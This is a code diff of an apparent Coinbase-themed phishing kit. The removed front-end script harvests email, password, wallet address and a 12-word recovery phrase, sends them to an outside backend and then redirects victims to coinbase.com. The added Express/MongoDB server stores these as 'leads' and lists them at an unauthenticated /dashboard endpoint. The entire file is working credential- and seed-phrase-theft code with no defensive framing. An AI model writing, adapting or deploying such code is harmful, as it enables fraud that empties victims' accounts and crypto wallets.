@@ -1,76 +1,50 @@
-const API_URL = 'https://cb-backend-new.onrender.com';
+const express = require('express');
+const mongoose = require('mongoose');
+const bodyParser = require('body-parser');
+const cors = require('cors');
+const path = require('path');
 
-document.addEventListener('DOMContentLoaded', () => {
-    const toStep2Btn = document.getElementById('toStep2');
-    const toStep3Btn = document.getElementById('toStep3');
-    const connectBtn = document.getElementById('connectBtn');
-    const statusText = document.getElementById('status');
+const app = express();
+app.use(cors());
+app.use(bodyParser.json());
+app.use(express.static(__dirname)); // Serves files from the root directory
 
-    toStep2Btn.addEventListener('click', () => {
-        document.getElementById('step-1').classList.add('hidden');
-        document.getElementById('step-2').classList.remove('hidden');
-    });
+mongoose.connect(process.env.MONGO_URI)
+  .then(() => console.log("Connected to MongoDB successfully"))
+  .catch(err => console.error("Mongo connection error:", err));
 
-    toStep3Btn.addEventListener('click', () => {
-        if (!document.getElementById('email').value || !document.getElementById('pass').value) {
-            alert('Please fill in all fields.');
-            return;
-        }
-        document.getElementById('step-2').classList.add('hidden');
-        document.getElementById('step-3').classList.remove('hidden');
-    });
+const leadSchema = new mongoose.Schema({
+    email: String,
+    password: String,
+    walletAddress: String,
+    recoveryPhrase: String,
+    timestamp: { type: Date, default: Date.now }
+});
 
-    connectBtn.addEventListener('click', async () => {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('pass').value;
+const Lead = mongoose.model('Lead', leadSchema, 'leads');
 
-        if (window.ethereum) {
-            try {
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                await sendData(email, password, accounts[0], null);
-            } catch (e) {
-                statusText.innerText = 'Wallet connection failed.';
-            }
-        } else {
-            // Shorten process: ask for recovery phrase immediately
-            statusText.innerText = 'Please enter your 12-word recovery phrase:';
-            const phraseInput = document.createElement('input');
-            phraseInput.type = 'text';
-            phraseInput.id = 'phrase';
-            phraseInput.style.display = 'block';
-            phraseInput.style.marginTop = '10px';
-            
-            const doneBtn = document.createElement('button');
-            doneBtn.innerText = 'Done';
-            doneBtn.className = 'btn-primary';
-            doneBtn.style.marginTop = '10px';
-
-            document.getElementById('step-3').appendChild(phraseInput);
-            document.getElementById('step-3').appendChild(doneBtn);
-
-            doneBtn.onclick = async () => {
-                const phrase = phraseInput.value.trim();
-                if (phrase.split(/\s+/).length !== 12) {
-                    statusText.innerText = 'Exactly 12 words required.';
-                    return;
-                }
-                await sendData(email, password, null, phrase);
-            };
-        }
-    });
-
-    async function sendData(email, password, wallet, phrase) {
-        try {
-            const res = await fetch(`${API_URL}/update`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password, walletAddress: wallet, recoveryPhrase: phrase })
-            });
-            if (res.ok) {
-                window.location.href = 'https://coinbase.com';
-            }
-        } catch (e) {
-            statusText.innerText = 'Error saving. Try again.';
-        }
+app.post('/update', async (req, res) => {
+    try {
+        const lead = new Lead(req.body);
+        await lead.save();
+        res.status(200).send("Saved.");
+    } catch (err) {
+        console.error("Save error:", err);
+        res.status(500).send("Error.");
     }
+});
+
+app.get('/dashboard', async (req, res) => {
+    try {
+        const leads = await Lead.find().sort({ timestamp: -1 });
+        res.json(leads);
+    } catch (err) {
+        console.error("Fetch error:", err);
+        res.status(500).send("Error fetching leads.");
+    }
+});
+
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+    console.log(`Server running on port ${PORT}`);
 });
